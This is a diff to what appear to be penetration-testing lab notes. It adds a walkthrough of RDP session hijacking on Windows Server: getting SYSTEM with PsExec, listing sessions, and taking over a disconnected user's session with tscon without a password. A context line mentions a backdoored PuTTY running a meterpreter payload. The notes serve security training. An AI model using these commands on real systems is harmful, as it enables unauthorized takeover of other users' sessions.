@@ -337,3 +337,18 @@ The resulting `puttyX.exe` will execute a reverse_tcp meterpreter payload withou
 ### RDP hijacking
 When an administrator uses Remote Desktop to connect to a machine and closes the RDP client instead of logging off, his session will remain open on the server indefinitely. If you have SYSTEM privileges on Windows Server 2016 and earlier, you can take over any existing RDP session without requiring a password.  
 If we have administrator-level access, we can get SYSTEM by any method of our preference. For now, we will be using psexec to do so. First, let's run a cmd.exe as administrator:
+```
+PsExec64.exe -s cmd.exe
+```
+To list the existing sessions on a server, you can use the following command:  
+```
+C:\> query user
+ USERNAME              SESSIONNAME        ID  STATE   IDLE TIME  LOGON TIME
+>administrator         rdp-tcp#6           2  Active          .  4/1/2022 4:09 AM
+ luke                                    3  Disc            .  4/6/2022 6:51 AM
+```
+To connect to a session, we will use tscon.exe and specify the session ID we will be taking over, as well as our current SESSIONNAME. Following the previous example, to takeover luke's session if we were connected as the administrator user, we'd use the following command:
+```
+tscon 3 /dest:rdp-tcp#6
+```  
+Note: Windows Server 2019 won't allow you to connect to another user's session without knowing its password.  
